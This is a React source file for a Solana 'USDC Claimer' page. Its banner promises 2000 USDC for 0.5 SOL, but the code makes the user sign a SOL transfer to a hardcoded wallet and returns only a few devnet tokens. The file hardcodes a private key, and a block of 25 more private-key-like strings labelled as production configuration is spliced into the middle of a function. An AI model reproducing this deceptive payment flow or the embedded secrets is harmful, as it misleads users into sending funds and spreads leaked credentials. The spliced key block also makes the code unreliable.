/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "rvno711LmxQLeeN73cEhinz6peRT4RUadgqkibcV66dWPbiaFi4XGv865fGukHzakcutKndyr4uWfwEe3XVAUjq"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "64Z3ondrLQiHoZjK2RVWNuuoNtmQsaBtpZdfRmpDkMfnDsXKukEJzzCAG34F7QfxcFeNNndxK1JuwfzH7ctBK1VT",
  "key1": "bqNswSEXwCd4SCsAibcSszriQj8iqj4HmWu6KHNKYJYsWkiiJXnvVLtSbpZnTJ7rc5SUj7vwDok2jurdn3Uz5gz",
  "key2": "4Gv4xNgz8GhM6JwS5NVmBGZvtAY9D7Uy9gjukJfQXMKxT4tMq9ZrjiYJujtAPkxQcnaTyyw6kgsmPotBWMFHFVkQ",
  "key3": "4hK7EPRoqN8tRWNWzNJEUJ3E9XQcbf54euohjEsjCPWtJ9bjJckvVmmaiGaR42e6g8zFTsdSG8x9AVTT89w5ahcf",
  "key4": "3KFs6jhrsB5ZJPqAdcqo33r6Z2oXKPrVqXTAAXxbAJ6HamK3RgRNtAwEtHQ7Lo4nayYy8aiiH6M7ay8vDq4KNTVs",
  "key5": "38idHkvEXzgKYKerJmvu29WYGFXZ1spj1rAKTRdShGiCB7VDAE1BWbx57JdHWdgHssEr5fZNs1htd1YrMKmFZgjq",
  "key6": "2KuwBwswyWYmND5fPLiHQTU3c4fK39WyKdGwquJkhVfUdQdFppJEqDoCbkhRqbhafonTYTXCNGWiamgytS2AuNEV",
  "key7": "3W9jTxEXtaYWP7GN8pwYu3MAHjZhCuyut6h2N4jucFHbFN82EhZ8dNB4TGrZxmK3LwsTJ7Yrf7tsKdTQ9q1QMFyF",
  "key8": "2VtdheGBYU6CXCxSbhCF56sw8hpRZUSWmJoqpPxtTqHCkKKEELRYVTFAZxTSnMn2a1ETFL1wCEzFJqms7vZQRAf8",
  "key9": "rnfcUjYpiVHeLd6zU2JRst4n6tPaLVv1jm8c8gueRUYmyiQz96Dm7P93jJJqLpNzGvTVKRkPXXHtaK6VgS5DYQX",
  "key10": "3HY5D6Xqp16PzQc73iLRWbn6DBjFzhqPhX7ypMCKLDwi4uANFVgB51rXmSLTs7RsKbFBqZEDMZ9xY2VqBXeioyeZ",
  "key11": "44W5YeRrBuX5zKRiQsDF2PAAWzPVcTWxmTo7KJYYzRcCDpojdesXVRBNW8D48t4238DUjTjpmU8TKgLmxABG5YzS",
  "key12": "3zHssYEZtNnBME4qfvMLL83FHXPrDSx2qJJXuEfwRWqB8FCM8WkvnqR9bNmaUs2P5GrLMk7FhJQx4fbXT8FKN88D",
  "key13": "3D5TtYFkhxjYWjHzQ5UsrAELQBCYx6aDvPRaRCzyWvQ8zV3qfMkqwhC7af11TaspfrcBxRHqLvgwBcHAtiJdbC2o",
  "key14": "47YmGNDrgMBUoY2drKk97ctxtJ3vaNEMQez54SDBbNtJFpS4MAmFekiUFcNAghZo1sQ5ywsnAvG98dhPZPC7HcSh",
  "key15": "4sAht9YktmqkiZK59WoqcUiABx3yQRgk3FkpeZVzVjfSDVtxGaLdok8SsAfm9aWiAXs2BzrHUe5ryx6F4yKuA2sB",
  "key16": "5mMzBjtzFEtwetpv85nJerN43j96NoRJDqXigWaM3W4hXN91Nj8CC1h5g3o9fkkbs3cs84gSdUBoPNA8Bd8thHB1",
  "key17": "4xFsXfsvMGzRzGaZhzu9sHBbz18RUEFscZJUK9nraPm379eNdNvuA3G8CiHbwnTw4H4vsCVePsesU94noxsZoatb",
  "key18": "5VBK5fQUDuQLv1AmZ7MWefmYh69b15VWn177XruBQpZoC7UQAuZfvZmLGCvPaeUdDwCQ5Eq2vdTt7hsz59XajuJG",
  "key19": "4tM3jvJm4zJjyXYQUz2yWrxE4v249aqHUNqpJthXdMmPov2fxw3QMa1KocMSGMwRVHajwTM7UzCyC14Lu4SfyyvQ",
  "key20": "3CLUuEuiStthJ1DgFhEkAb2zdKNgxfe5kKsVPKpED7Mv3Q1q1rohPEvPitjuMKkgY1zzADEij5shUGDhSjYGAvaP",
  "key21": "3BCZ7DUFR5mmQW4SoQbnvA4acfaCWK2pQC2RFzYBUYAwFWWmjaUZ83qP3zsBiLWQLFWABJ34N6HVW7VXpZ3gCoLa",
  "key22": "Bgg9uZGaCTSKx58VdLsRtBteHu93wMK1ecPuxL2AEpQgN3qEMxHpx6rMBMjLBrXGrsyJSiofgkUVtVNV5p9wmZ3",
  "key23": "5rGTGxWocN5wsoPYPAwtY8RmJwxjQPq1Ai2YGuKEsKyHSHuBZ2KbKyh7zXZTAgsFnk8VSzSXmAv6LGQZzbb4iQRh",
  "key24": "Gu744P1rvGwW2WobWyczEaJkGB66B2pywiRNmpNVLB4HMo28a5uQzSiDybCZj7gtYEjDxg7zLKqbfq9tZnqaPKa"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
